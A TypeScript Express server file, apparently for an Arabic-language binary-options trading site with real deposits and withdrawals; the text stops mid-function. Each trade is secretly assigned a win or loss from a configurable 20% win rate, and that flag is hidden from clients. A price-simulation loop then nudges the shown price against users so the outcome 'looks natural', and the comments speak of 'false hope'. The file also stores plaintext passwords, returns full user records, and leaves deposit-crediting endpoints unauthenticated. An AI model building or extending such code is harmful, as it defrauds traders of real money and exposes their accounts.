import type { Express } from "express";
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { storage } from "./storage";
import { insertTradeSchema, insertDepositSchema, insertWithdrawalSchema, updateSettingsSchema, type Trade } from "@shared/schema";
import { z } from "zod";
import axios from "axios";
import { MarketEngine, CandleSchema, PriceTickSchema } from "./market-engine";
import { WebSocketHandler } from "./websocket-handler";

const BINOMO_SERVICE_URL = process.env.BINOMO_SERVICE_URL || 'http://localhost:5001';

export async function registerRoutes(app: Express): Promise<Server> {
  const httpServer = createServer(app);

  // Track active trades for price manipulation
  interface ActiveTrade {
    id: string;
    assetId: string;
    type: 'CALL' | 'PUT';
    openPrice: number;
    openTime: number;
    expiryTime: number;
    shouldWin: boolean; // Pre-determined win/loss (20% win rate)
  }
  const activeTrades = new Map<string, ActiveTrade>();

  // Load open trades from database on startup
  async function loadOpenTrades() {
    try {
      const allTrades = await storage.getAllTrades();
      const openTrades = allTrades.filter(t => t.status === 'open');
      
      openTrades.forEach(trade => {
        const expiryTime = new Date(trade.expiryTime).getTime();
        const createdAt = new Date(trade.createdAt || Date.now()).getTime();
        
        // Only add if not expired
        if (expiryTime > Date.now()) {
          activeTrades.set(trade.id, {
            id: trade.id,
            assetId: trade.assetId,
            type: trade.type as 'CALL' | 'PUT',
            openPrice: parseFloat(trade.openPrice),
            openTime: createdAt,
            expiryTime: expiryTime,
            shouldWin: trade.shouldWin || false,
          });
          console.log(`Loaded open trade: ${trade.id} for ${trade.assetId}`);
        }
      });
      
      console.log(`Loaded ${activeTrades.size} open trades from database`);
    } catch (error) {
      console.error('Error loading open trades:', error);
    }
  }
  
  // Load open trades immediately
  await loadOpenTrades();

  // Binomo API endpoints - Direct implementation (no external service needed)
  const AUTHTOKEN = process.env.BINOMO_AUTHTOKEN || '';
  const DEVICE_ID = process.env.BINOMO_DEVICE_ID || '';
  const HAS_CREDS = Boolean(AUTHTOKEN && DEVICE_ID);

  // Current user endpoint - returns the authenticated user
  app.get("/api/me", async (req, res) => {
    // Use demo_user as fallback for backwards compatibility
    const userId = req.session.userId || 'demo_user';
    const user = await storage.getUser(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    res.json({
      id: user.id,
      username: user.username,
      email: user.email,
      demoBalance: user.demoBalance,
      realBalance: user.realBalance,
    });
  });

  app.get("/api/binomo/health", async (req, res) => {
    res.json({
      status: "ok",
      connected: HAS_CREDS,
      service: "binomo-api",
      has_credentials: HAS_CREDS,
      auth_token_present: Boolean(AUTHTOKEN),
      device_id_present: Boolean(DEVICE_ID),
      mode: HAS_CREDS ? "configured" : "simulated"
    });
  });

  app.get("/api/binomo/balance", async (req, res) => {
    // Return balance (simulated for now, real API integration can be added)
    res.json({
      demo: 10000.00,
      real: 0.00,
      current: 10000.00,
      mode: "demo"
    });
  });

  app.get("/api/binomo/assets", async (req, res) => {
    // Return OTC assets from storage
    try {
      const assets = await storage.getAllAssets();
      res.json(assets);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch OTC assets" });
    }
  });

  app.get("/api/price-data/:assetId", async (req, res) => {
    try {
      const { assetId } = req.params;
      
      // Load last 100 candles for persistent chart (newest first from DB)
      const priceData = await storage.getPriceData(assetId, 100);
      
      // Convert to candle format and reverse to get oldest-to-newest order
      const candles = priceData.map(pd => ({
        time: Math.floor(new Date(pd.timestamp).getTime() / 1000),
        open: parseFloat(pd.open),
        high: parseFloat(pd.high),
        low: parseFloat(pd.low),
        close: parseFloat(pd.close),
      })).reverse(); // Reverse because DB returns newest first
      
      res.json(candles);
    } catch (error) {
      console.error('Error fetching price data:', error);
      res.status(500).json({ message: "Failed to fetch price data" });
    }
  });

  app.get("/api/binomo/candles/:assetId/:timeframe?", async (req, res) => {
    const { assetId, timeframe } = req.params;
    const count = parseInt(req.query.count as string) || 100;
    
    try {
      // ✅ CRITICAL FIX: Load candles from DB instead of generating random ones
      const dbCandles = await storage.getPriceData(assetId, count);
      
      if (dbCandles && dbCandles.length >= count) {
        // ✅ Return saved candles from database (preserve chart shape)
        const candles = dbCandles.map(pd => ({
          timestamp: Math.floor(new Date(pd.timestamp).getTime() / 1000),
          open: parseFloat(pd.open),
          high: parseFloat(pd.high),
          low: parseFloat(pd.low),
          close: parseFloat(pd.close),
          volume: 0
        })).reverse(); // Reverse: oldest to newest
        
        console.log(`✅ Loaded ${candles.length} candles from DB for ${assetId}`);
        return res.json(candles);
      }
      
      // Only generate if no data exists (first time only)
      console.log(`⚠️ No DB candles for ${assetId}, generating initial data...`);
      
      // Extended timeframe support for OTC market (5s to 4h)
      const timeframeSeconds: Record<string, number> = {
        '5s': 5,
        '30s': 30,
        '1m': 60,
        '5m': 300,
        '15m': 900,
        '30m': 1800,
        '1h': 3600,
        '4h': 14400,
      };
      const intervalSeconds = timeframeSeconds[timeframe || '1m'] || 60;
      
      // Fallback base prices (used only if no DB data exists) - Only 4 best OTC assets
      const fallbackPrices: Record<string, number> = {
        "EURUSD_OTC": 1.0856,
        "GBPUSD_OTC": 1.2678,
        "BTCUSD_OTC": 43256.50,
        "GOLD_OTC": 2045.30
      };
      
      let basePrice = fallbackPrices[assetId] || 1.0;
      const currentTime = Math.floor(Date.now() / 1000);
      const candles = [];
      
      // Dynamic volatility based on asset type (only 4 OTC assets)
      const getVolatility = (id: string): number => {
        if (id.includes("BTC")) return 0.025;
        if (id.includes("GOLD")) return 0.008;
        return 0.0015; // Forex default (EURUSD, GBPUSD)
      };
      
      const getDecimals = (id: string): number => {
        if (id.includes("BTC")) return 2;
        if (id.includes("GOLD")) return 2;
        return 5; // Forex default (EURUSD, GBPUSD)
      };
      
      const volatility = getVolatility(assetId);
      const decimals = getDecimals(assetId);
      
      for (let i = 0; i < count; i++) {
        const priceChange = (Math.random() - 0.5) * volatility * basePrice;
        const openPrice = basePrice + priceChange;
        
        // More realistic high/low generation
        const highChange = Math.random() * volatility * basePrice * 0.7;
        const lowChange = Math.random() * volatility * basePrice * 0.7;
        const closeChange = (Math.random() - 0.5) * volatility * basePrice * 0.8;
        
        candles.push({
          timestamp: currentTime - (count - i) * intervalSeconds,
          open: parseFloat(openPrice.toFixed(decimals)),
          high: parseFloat((Math.max(openPrice, openPrice + closeChange) + highChange).toFixed(decimals)),
          low: parseFloat((Math.min(openPrice, openPrice + closeChange) - lowChange).toFixed(decimals)),
          close: parseFloat((openPrice + closeChange).toFixed(decimals)),
          volume: Math.floor(Math.random() * 150000) + 5000
        });
        
        basePrice = candles[candles.length - 1].close;
      }
      
      res.json(candles);
    } catch (error) {
      console.error(`❌ Error loading candles for ${assetId}:`, error);
      res.status(500).json({ message: "Failed to load candles" });
    }
  });

  app.post("/api/binomo/trade", async (req, res) => {
    const { asset_id, amount, direction, duration } = req.body;
    const tradeId = `trade_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    // Simulate trade execution
    res.json({
      success: true,
      trade_id: tradeId,
      asset_id,
      amount,
      direction,
      duration,
      note: HAS_CREDS ? "Trade configured with credentials" : "Trade simulated"
    });
  });

  app.get("/api/binomo/trade/check/:tradeId", async (req, res) => {
    const { tradeId } = req.params;
    const result = Math.random() > 0.45 ? "win" : "loss";
    
    res.json({
      trade_id: tradeId,
      result,
      payout: result === "win" ? 1.85 : 0
    });
  });

  app.post("/api/binomo/account/switch", async (req, res) => {
    const { type } = req.body;
    res.json({
      success: true,
      account_type: type || 'PRACTICE'
    });
  });

  app.get("/api/binomo/price/:assetId", async (req, res) => {
    const { assetId } = req.params;
    
    // Get current price from storage
    try {
      const asset = await storage.getAsset(assetId);
      if (!asset) {
        return res.status(404).json({ message: "Asset not found" });
      }
      
      res.json({
        asset_id: assetId,
        price: parseFloat(asset.currentPrice),
        timestamp: Math.floor(Date.now() / 1000)
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch price" });
    }
  });

  // Get all assets
  app.get("/api/assets", async (req, res) => {
    try {
      const assets = await storage.getAllAssets();
      res.json(assets);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch assets" });
    }
  });

  // Get asset by ID
  app.get("/api/assets/:id", async (req, res) => {
    try {
      const asset = await storage.getAsset(req.params.id);
      if (!asset) {
        return res.status(404).json({ message: "Asset not found" });
      }
      res.json(asset);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch asset" });
    }
  });

  // Create a new trade
  app.post("/api/trades", async (req, res) => {
    try {
      // Get win rate from settings
      const settings = await storage.getSettings();
      const winRate = parseFloat(settings.winRate || "20.00") / 100; // Convert percentage to decimal
      
      // Determine win/loss based on configured win rate
      const shouldWin = Math.random() < winRate;
      
      // Preprocess: convert expiry string to Date and add shouldWin
      const processedBody = {
        ...req.body,
        expiryTime: typeof req.body.expiryTime === 'string' ? new Date(req.body.expiryTime) : req.body.expiryTime,
        shouldWin
      };
      const validated = insertTradeSchema.parse(processedBody);
      
      // Deduct trade amount from user balance
      const user = await storage.getUser(validated.userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      
      const tradeAmount = parseFloat(validated.amount);
      if (validated.isDemo) {
        const currentBalance = parseFloat(user.demoBalance || "0");
        if (currentBalance < tradeAmount) {
          return res.status(400).json({ message: "Insufficient balance" });
        }
        const newDemoBalance = (currentBalance - tradeAmount).toFixed(2);
        await storage.updateUserBalance(validated.userId, newDemoBalance, user.realBalance || "0.00");
      } else {
        const currentBalance = parseFloat(user.realBalance || "0");
        if (currentBalance < tradeAmount) {
          return res.status(400).json({ message: "Insufficient balance" });
        }
        const newRealBalance = (currentBalance - tradeAmount).toFixed(2);
        await storage.updateUserBalance(validated.userId, user.demoBalance || "10000.00", newRealBalance);
      }
      
      const trade = await storage.createTrade(validated);
      
      // Track this trade for price manipulation
      activeTrades.set(trade.id, {
        id: trade.id,
        assetId: trade.assetId,
        type: trade.type as 'CALL' | 'PUT',
        openPrice: parseFloat(trade.openPrice),
        openTime: Date.now(),
        expiryTime: new Date(trade.expiryTime).getTime(),
        shouldWin
      });
      
      console.log(`Trade ${trade.id} created: ${trade.type} on ${trade.assetId}, shouldWin: ${shouldWin}, winRate: ${settings.winRate}%`);
      
      // Remove shouldWin from response to prevent client from seeing predetermined outcome
      const { shouldWin: _, ...tradeResponse } = trade;
      res.json(tradeResponse);
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: "Invalid trade data", errors: error.errors });
      }
      res.status(500).json({ message: "Failed to create trade" });
    }
  });

  // Get user trades
  app.get("/api/trades/user/:userId", async (req, res) => {
    try {
      const trades = await storage.getTradesByUser(req.params.userId);
      // Remove shouldWin from all trades
      const sanitizedTrades = trades.map(({ shouldWin, ...trade }) => trade);
      res.json(sanitizedTrades);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch trades" });
    }
  });

  // Get open trades for user
  app.get("/api/trades/user/:userId/open", async (req, res) => {
    try {
      const trades = await storage.getOpenTradesByUser(req.params.userId);
      // Remove shouldWin from all trades
      const sanitizedTrades = trades.map(({ shouldWin, ...trade }) => trade);
      res.json(sanitizedTrades);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch open trades" });
    }
  });

  // Close trade
  app.patch("/api/trades/:id/close", async (req, res) => {
    try {
      const { closePrice } = req.body;
      
      // Get the trade to check shouldWin
      const trade = await storage.getTrade(req.params.id);
      
      if (!trade) {
        return res.status(404).json({ message: "Trade not found" });
      }
      
      // Get user to update balance
      const user = await storage.getUser(trade.userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      
      // Determine outcome based on shouldWin (enforced 20% win rate)
      let status: string;
      let payout: string;
      
      if (trade.shouldWin) {
        // Force win - payout is original amount + 92% profit = 1.92x
        status = 'won';
        payout = (parseFloat(trade.amount) * 1.92).toString();
      } else {
        // Force loss
        status = 'lost';
        payout = '0';
      }
      
      const updatedTrade = await storage.updateTrade(req.params.id, closePrice, status, payout);
      
      // Update user balance if trade won
      if (status === 'won' && payout !== '0') {
        const payoutAmount = parseFloat(payout);
        if (trade.isDemo) {
          const newDemoBalance = (parseFloat(user.demoBalance || "0") + payoutAmount).toFixed(2);
          await storage.updateUserBalance(trade.userId, newDemoBalance, user.realBalance || "0.00");
        } else {
          const newRealBalance = (parseFloat(user.realBalance || "0") + payoutAmount).toFixed(2);
          await storage.updateUserBalance(trade.userId, user.demoBalance || "10000.00", newRealBalance);
        }
      }
      
      // Remove from active trades
      activeTrades.delete(req.params.id);
      console.log(`Trade ${req.params.id} closed: ${status} (shouldWin: ${trade.shouldWin})`);
      
      res.json(updatedTrade);
    } catch (error) {
      res.status(500).json({ message: "Failed to close trade" });
    }
  });

  // Create demo user (for development)
  app.post("/api/users/demo", async (req, res) => {
    try {
      const user = await storage.createUser({
        username: `demo_${Date.now()}`,
        email: `demo_${Date.now()}@bokoption.com`,
        password: "demo123"
      });
      res.json(user);
    } catch (error) {
      res.status(500).json({ message: "Failed to create demo user" });
    }
  });

  // Sign up new user
  app.post("/api/auth/signup", async (req, res) => {
    try {
      const { username, email, password } = req.body;
      
      // Validation
      if (!username || !email || !password) {
        return res.status(400).json({ message: "جميع الحقول مطلوبة" });
      }
      
      if (password.length < 6) {
        return res.status(400).json({ message: "كلمة المرور يجب أن تكون 6 أحرف على الأقل" });
      }
      
      // Check if user already exists
      const existingUsers = await storage.getAllUsers();
      const userExists = existingUsers.some(
        u => u.username === username || u.email === email
      );
      
      if (userExists) {
        return res.status(400).json({ message: "اسم المستخدم أو البريد الإلكتروني موجود بالفعل" });
      }
      
      // Create new user with +200$ bonus
      const user = await storage.createUser({
        username,
        email,
        password, // TODO: Hash password in production
        demoBalance: "10200.00", // 10,000 + 200 bonus
        realBalance: "0.00",
      });
      
      // Auto login after signup
      req.session.userId = user.id;
      
      // Return user without password
      const { password: _, ...userWithoutPassword } = user;
      res.json(userWithoutPassword);
    } catch (error) {
      console.error("Sign up error:", error);
      res.status(500).json({ message: "حدث خطأ أثناء التسجيل" });
    }
  });

  // Login
  app.post("/api/auth/login", async (req, res) => {
    try {
      const { username, password } = req.body;
      
      // Validation
      if (!username || !password) {
        return res.status(400).json({ message: "جميع الحقول مطلوبة" });
      }
      
      // Find user by username
      const user = await storage.getUserByUsername(username);
      if (!user) {
        return res.status(401).json({ message: "اسم المستخدم أو كلمة المرور غير صحيحة" });
      }
      
      // Check password (TODO: Use bcrypt in production)
      if (user.password !== password) {
        return res.status(401).json({ message: "اسم المستخدم أو كلمة المرور غير صحيحة" });
      }
      
      // Store userId in session
      req.session.userId = user.id;
      
      // Return user without password
      const { password: _, ...userWithoutPassword } = user;
      res.json(userWithoutPassword);
    } catch (error) {
      console.error("Login error:", error);
      res.status(500).json({ message: "حدث خطأ أثناء تسجيل الدخول" });
    }
  });

  // Logout
  app.post("/api/auth/logout", (req, res) => {
    req.session.destroy((err) => {
      if (err) {
        return res.status(500).json({ message: "حدث خطأ أثناء تسجيل الخروج" });
      }
      res.json({ message: "تم تسجيل الخروج بنجاح" });
    });
  });

  // Get current user
  app.get("/api/auth/me", async (req, res) => {
    try {
      if (!req.session.userId) {
        return res.status(401).json({ message: "غير مسجل دخول" });
      }
      
      const user = await storage.getUser(req.session.userId);
      if (!user) {
        return res.status(404).json({ message: "المستخدم غير موجود" });
      }
      
      // Return user without password
      const { password: _, ...userWithoutPassword } = user;
      res.json(userWithoutPassword);
    } catch (error) {
      console.error("Get current user error:", error);
      res.status(500).json({ message: "حدث خطأ" });
    }
  });

  // Get user by ID
  app.get("/api/users/:userId", async (req, res) => {
    try {
      const user = await storage.getUser(req.params.userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      res.json(user);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch user" });
    }
  });

  // Deposit endpoints
  app.post("/api/deposits", async (req, res) => {
    try {
      // Use session userId or fallback to demo_user
      const authenticatedUserId = req.session.userId || 'demo_user';
      
      // Parse request body but ignore any client-supplied userId
      const { amount, method, status, transactionHash, walletAddress } = req.body;
      
      // Validate the deposit data using schema
      const validated = insertDepositSchema.parse({
        userId: authenticatedUserId, // Use server-authenticated user ID only
        amount,
        method,
        status,
        transactionHash,
        walletAddress,
      });
      
      const user = await storage.getUser(authenticatedUserId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      const deposit = await storage.createDeposit(validated);
      res.json(deposit);
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: "Invalid deposit data", errors: error.errors });
      }
      res.status(500).json({ message: "Failed to create deposit" });
    }
  });

  app.get("/api/deposits/user/:userId", async (req, res) => {
    try {
      // Use session userId or fallback to demo_user
      const authenticatedUserId = req.session.userId || 'demo_user';
      
      // Ignore the URL parameter and use authenticated user ID only
      const deposits = await storage.getDepositsByUser(authenticatedUserId);
      res.json(deposits);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch deposits" });
    }
  });

  const depositStatusSchema = z.object({
    status: z.enum(['pending', 'completed', 'failed', 'cancelled'])
  });

  app.patch("/api/deposits/:id/status", async (req, res) => {
    try {
      const { status } = depositStatusSchema.parse(req.body);
      const deposit = await storage.getDeposit(req.params.id);
      
      if (!deposit) {
        return res.status(404).json({ message: "Deposit not found" });
      }

      const user = await storage.getUser(deposit.userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      const completedAt = status === "completed" ? new Date() : undefined;
      const updatedDeposit = await storage.updateDepositStatus(req.params.id, status, completedAt);

      if (status === "completed") {
        const newRealBalance = (parseFloat(user.realBalance || "0") + parseFloat(deposit.amount)).toFixed(2);
        await storage.updateUserBalance(deposit.userId, user.demoBalance || "10000.00", newRealBalance);
      }

      res.json(updatedDeposit);
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: "Invalid status", errors: error.errors });
      }
      res.status(500).json({ message: "Failed to update deposit status" });
    }
  });

  // Withdrawal endpoints
  app.post("/api/withdrawals", async (req, res) => {
    try {
      // Use session userId or fallback to demo_user
      const authenticatedUserId = req.session.userId || 'demo_user';
      
      // Parse request body but ignore any client-supplied userId
      const { amount, address, method, fee, notes } = req.body;
      
      // Validate the withdrawal data using schema
      const validated = insertWithdrawalSchema.parse({
        userId: authenticatedUserId, // Use server-authenticated user ID only
        amount,
        address,
        method,
        fee,
        notes,
      });
      
      const user = await storage.getUser(authenticatedUserId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      // Check if user has sufficient balance
      const currentBalance = parseFloat(user.realBalance || "0");
      const withdrawAmount = parseFloat(validated.amount);
      const withdrawFee = parseFloat(validated.fee || "1");
      const totalAmount = withdrawAmount + withdrawFee;

      if (currentBalance < totalAmount) {
        return res.status(400).json({ message: "Insufficient balance" });
      }

      const withdrawal = await storage.createWithdrawal(validated);
      
      // Deduct amount immediately when withdrawal is requested
      const newBalance = (currentBalance - totalAmount).toFixed(2);
      await storage.updateUserBalance(authenticatedUserId, user.demoBalance || "10000.00", newBalance);

      res.json(withdrawal);
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: "Invalid withdrawal data", errors: error.errors });
      }
      res.status(500).json({ message: "Failed to create withdrawal" });
    }
  });

  app.get("/api/withdrawals/user/:userId", async (req, res) => {
    try {
      // Use session userId or fallback to demo_user
      const authenticatedUserId = req.session.userId || 'demo_user';
      
      // Ignore the URL parameter and use authenticated user ID only
      const withdrawals = await storage.getWithdrawalsByUser(authenticatedUserId);
      res.json(withdrawals);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch withdrawals" });
    }
  });

  const withdrawalStatusSchema = z.object({
    status: z.enum(['pending', 'processing', 'completed', 'rejected']),
    transactionHash: z.string().optional(),
    notes: z.string().optional(),
  });

  app.patch("/api/withdrawals/:id/status", async (req, res) => {
    try {
      const { status, transactionHash, notes } = withdrawalStatusSchema.parse(req.body);
      const withdrawal = await storage.getWithdrawal(req.params.id);
      
      if (!withdrawal) {
        return res.status(404).json({ message: "Withdrawal not found" });
      }

      const user = await storage.getUser(withdrawal.userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      const processedAt = status === "completed" || status === "rejected" ? new Date() : undefined;
      const updatedWithdrawal = await storage.updateWithdrawalStatus(
        req.params.id,
        status,
        processedAt,
        transactionHash,
        notes
      );

      // If rejected, refund the amount to user
      if (status === "rejected") {
        const refundAmount = parseFloat(withdrawal.amount) + parseFloat(withdrawal.fee || "1");
        const newRealBalance = (parseFloat(user.realBalance || "0") + refundAmount).toFixed(2);
        await storage.updateUserBalance(withdrawal.userId, user.demoBalance || "10000.00", newRealBalance);
      }

      res.json(updatedWithdrawal);
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: "Invalid status", errors: error.errors });
      }
      res.status(500).json({ message: "Failed to update withdrawal status" });
    }
  });

  // WebSocket server for real-time updates
  const wss = new WebSocketServer({ server: httpServer, path: '/ws' });
  
  // Price simulation and WebSocket broadcasting
  const connectedClients = new Set<WebSocket>();
  
  // ✅ Track initialization status
  let isMarketsInitialized = false;

  wss.on('connection', (ws) => {
    connectedClients.add(ws);
    console.log('Client connected to WebSocket');

    ws.on('message', (message) => {
      try {
        const data = JSON.parse(message.toString());
        if (data.type === 'subscribe') {
          // Send initial asset data
          storage.getAllAssets().then(assets => {
            if (ws.readyState === WebSocket.OPEN) {
              ws.send(JSON.stringify({
                type: 'assets',
                data: assets
              }));
              
              // ✅ Only send candles if markets are initialized and data is valid
              if (isMarketsInitialized && Object.keys(currentCandles).length > 0) {
                // Filter out any invalid candles (null/undefined values)
                const validCandles: Record<string, any> = {};
                Object.entries(currentCandles).forEach(([pair, candle]) => {
                  if (candle && 
                      typeof candle.open === 'number' && 
                      typeof candle.high === 'number' && 
                      typeof candle.low === 'number' && 
                      typeof candle.close === 'number' &&
                      !isNaN(candle.open) &&
                      !isNaN(candle.high) &&
                      !isNaN(candle.low) &&
                      !isNaN(candle.close)) {
                    validCandles[pair] = candle;
                  }
                });
                
                if (Object.keys(validCandles).length > 0) {
                  ws.send(JSON.stringify({
                    type: 'current_candles',
                    data: {
                      candles: validCandles,
                      candleInterval: 60
                    }
                  }));
                }
              }
            }
          });
        }
        
        // ✅ Handle subscription to specific pair
        if (data.type === 'subscribe_pair' && data.pair) {
          const candle = currentCandles[data.pair];
          // Only send if candle exists and all values are valid numbers
          if (ws.readyState === WebSocket.OPEN && candle &&
              typeof candle.open === 'number' && 
              typeof candle.high === 'number' && 
              typeof candle.low === 'number' && 
              typeof candle.close === 'number' &&
              !isNaN(candle.open) &&
              !isNaN(candle.high) &&
              !isNaN(candle.low) &&
              !isNaN(candle.close)) {
            ws.send(JSON.stringify({
              type: 'current_candle',
              data: {
                pair: data.pair,
                candle,
                candleInterval: 60
              }
            }));
          }
        }
      } catch (error) {
        console.error('WebSocket message error:', error);
      }
    });

    ws.on('close', () => {
      connectedClients.delete(ws);
      console.log('Client disconnected from WebSocket');
    });
  });

  // Price simulation function
  const simulatePrices = () => {
    storage.getAllAssets().then(assets => {
      const updates: any[] = [];
      const currentTime = Date.now();
      
      assets.forEach(asset => {
        const currentPrice = parseFloat(asset.currentPrice);
        const baseVolatility = asset.category === 'crypto' ? 0.0015 : 0.0003; // Reduced for smoother movement
        
        // Check for active trades on this asset
        let priceManipulation = 0;
        let hasActiveTradeInLast20Seconds = false;
        
        activeTrades.forEach(trade => {
          if (trade.assetId === asset.id) {
            const timeRemaining = trade.expiryTime - currentTime;
            const tradeDuration = trade.expiryTime - trade.openTime;
            
            // Remove expired trades
            if (timeRemaining <= 0) {
              activeTrades.delete(trade.id);
              return;
            }
            
            // Smart manipulation - looks natural
            if (timeRemaining <= 30000) {
              hasActiveTradeInLast20Seconds = true;
              
              // Calculate time-based multiplier (gradual increase, not sudden)
              const timeProgress = (30000 - timeRemaining) / 30000; // 0 to 1
              const manipulationStrength = 2 + (timeProgress * 4); // 2x to 6x gradually
              
              if (!trade.shouldWin) {
                // 80% of trades: subtle but effective manipulation
                if (trade.type === 'CALL') {
                  // User wants price up, gradually push it DOWN
                  const currentlyWinning = currentPrice > trade.openPrice;
                  const priceDistance = Math.abs(currentPrice - trade.openPrice) / trade.openPrice;
                  
                  if (currentlyWinning) {
                    // Winning: create natural-looking pullback
                    if (timeRemaining <= 10000) {
                      // Last 10 seconds: increase pressure naturally
                      priceManipulation -= baseVolatility * manipulationStrength * (1 + priceDistance * 10);
                    } else {
                      // Before last 10 seconds: gentle pullback
                      priceManipulation -= baseVolatility * 2;
                    }
                  } else {
                    // Losing: prevent recovery with gentle pressure
                    priceManipulation -= baseVolatility * 1.5;
                  }
                } else {
                  // User wants price down, gradually push it UP
                  const currentlyWinning = currentPrice < trade.openPrice;
                  const priceDistance = Math.abs(currentPrice - trade.openPrice) / trade.openPrice;
                  
                  if (currentlyWinning) {
                    // Winning: create natural-looking bounce
                    if (timeRemaining <= 10000) {
                      // Last 10 seconds: increase pressure naturally
                      priceManipulation += baseVolatility * manipulationStrength * (1 + priceDistance * 10);
                    } else {
                      // Before last 10 seconds: gentle bounce
                      priceManipulation += baseVolatility * 2;
                    }
                  } else {
                    // Losing: prevent recovery with gentle pressure
                    priceManipulation += baseVolatility * 1.5;
                  }
                }
              } else {
                // 20% of trades: help user win naturally
                if (trade.type === 'CALL') {
                  const currentlyWinning = currentPrice > trade.openPrice;
                  if (!currentlyWinning) {
                    priceManipulation += baseVolatility * manipulationStrength; // Gradual push up
                  } else {
                    priceManipulation += baseVolatility * 0.5; // Maintain
                  }
                } else {
                  const currentlyWinning = currentPrice < trade.openPrice;
                  if (!currentlyWinning) {
                    priceManipulation -= baseVolatility * manipulationStrength; // Gradual push down
                  } else {
                    priceManipulation -= baseVolatility * 0.5; // Maintain
                  }
                }
              }
            }
            // Early stage: let trade develop naturally
            else if (!trade.shouldWin && timeRemaining <= 45000) {
              // 15 seconds before manipulation starts: plant seeds
              if (trade.type === 'CALL') {
                const currentlyWinning = currentPrice > trade.openPrice;
                if (currentlyWinning) {
                  // Already winning: very subtle downward bias
                  priceManipulation -= baseVolatility * 0.5;
                } else {
                  // Let it go up to give false hope
                  priceManipulation += baseVolatility * 0.3;
                }
              } else {
                const currentlyWinning = currentPrice < trade.openPrice;
                if (currentlyWinning) {
                  // Already winning: very subtle upward bias
                  priceManipulation += baseVolatility * 0.5;
                } else {
                  // Let it go down to give false hope
                  priceManipulation -= baseVolatility * 0.3;
                }
              }
            }
          }
        });
        
        // Natural market volatility with micro-movements
        let randomChange = (Math.random() - 0.5) * 2 * baseVolatility;
        
        // Add natural micro-fluctuations (makes price look alive)
        const microFluctuation = (Math.random() - 0.5) * baseVolatility * 0.3;
        randomChange += microFluctuation;
        
        // Occasional natural spike (3% chance, only when no active manipulation)
        if (Math.random() < 0.03 && !hasActiveTradeInLast20Seconds) {
          randomChange *= 3; // Natural market spike (reduced from 8)
        }
        
        // Add trend momentum (price tends to continue in same direction briefly)
        const priceTrend = (currentPrice - parseFloat(asset.currentPrice)) / parseFloat(asset.currentPrice);
        if (Math.abs(priceTrend) > 0.0001 && !hasActiveTradeInLast20Seconds) {
          randomChange += priceTrend * baseVolatility * 0.5; // Momentum effect
        }
        
        // Combine all factors
        const totalChange = randomChange + priceManipulation;
        const newPrice = currentPrice * (1 + totalChange);
        const priceChange = newPrice - currentPrice;
        const priceChangePercent = (priceChange / currentPrice) * 100;

        // Update asset in storage
        storage.updateAssetPrice(
          asset.id,
          newPrice.toFixed(asset.category === 'crypto' ? 2 : 4),
          priceChange.toFixed(asset.category === 'crypto' ? 2 : 6),
          priceChangePercent.toFixed(2)
        );

        updates.push({
          id: asset.id,
          price: newPrice.toFixed(asset.category === 'crypto' ? 2 : 4),
          change: priceChange.toFixed(asset.category === 'crypto' ? 2 : 6),
          changePercent: priceChangePercent.toFixed(2)
        });

        // Generate candlestick data (1 minute candles)
        const now = new Date();
        const open = currentPrice;
        const high = Math.max(open, newPrice) * (1 + Math.random() * 0.0005);
        const low = Math.min(open, newPrice) * (1 - Math.random() * 0.0005);
        
        storage.addPriceData({
          assetId: asset.id,
          timestamp: now,
          open: open.toString(),
          high: high.toString(),
          low: low.toString(),
          close: newPrice.toString(),
          volume: (Math.random() * 1000000).toString()
        });
      });

      // Broadcast to all connected clients
      const message = JSON.stringify({
        type: 'price_update',
        data: updates
      });

      connectedClients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
          client.send(message);
        } else {
          connectedClients.delete(client);
        }
      });
    });
  };

  // Start price simulation (every 1 second for smooth 1-minute candles)
  setInterval(simulatePrices, 1000); // Update every 1 second

  // OTC Market simulation - Initialize with all assets
  let otcMarkets: Record<string, number> = {};
  
  // Track current candle for each pair (to make candles grow gradually)
  interface CurrentCandle {
    pair: string;
    time: number;
    open: number;
    high: number;
    low: number;
    close: number;
    startTime: number;
  }
  
  const currentCandles: Record<string, CurrentCandle> = {};
  
  // Price momentum tracking for realistic movement
  const priceMomentum: Record<string, number> = {};
  const priceHistory: Record<string, number[]> = {};
  
  // ✅ NEW API: Get current candle state + historical data
  app.get("/api/price-data/:assetId/with-current", async (req, res) => {
    const { assetId } = req.params;
    const count = parseInt(req.query.count as string) || 100;
    
    try {
      // Load historical candles from DB
      const dbCandles = await storage.getPriceData(assetId, count);
      const candles = dbCandles
        .filter(pd => pd.open && pd.high && pd.low && pd.close)
        .map(pd => ({
          time: Math.floor(new Date(pd.timestamp).getTime() / 1000),
          open: parseFloat(pd.open),
          high: parseFloat(pd.high),
          low: parseFloat(pd.low),
          close: parseFloat(pd.close),
          volume: 0
        }))
        .filter(candle => 
          !isNaN(candle.open) && 
          !isNaN(candle.high) && 
          !isNaN(candle.low) && 
          !isNaN(candle.close) &&
          candle.open !== null &&
          candle.high !== null &&
          candle.low !== null &&
          candle.close !== null &&
          typeof candle.time === 'number' &&
          !isNaN(candle.time)
        )
        .reverse();
      
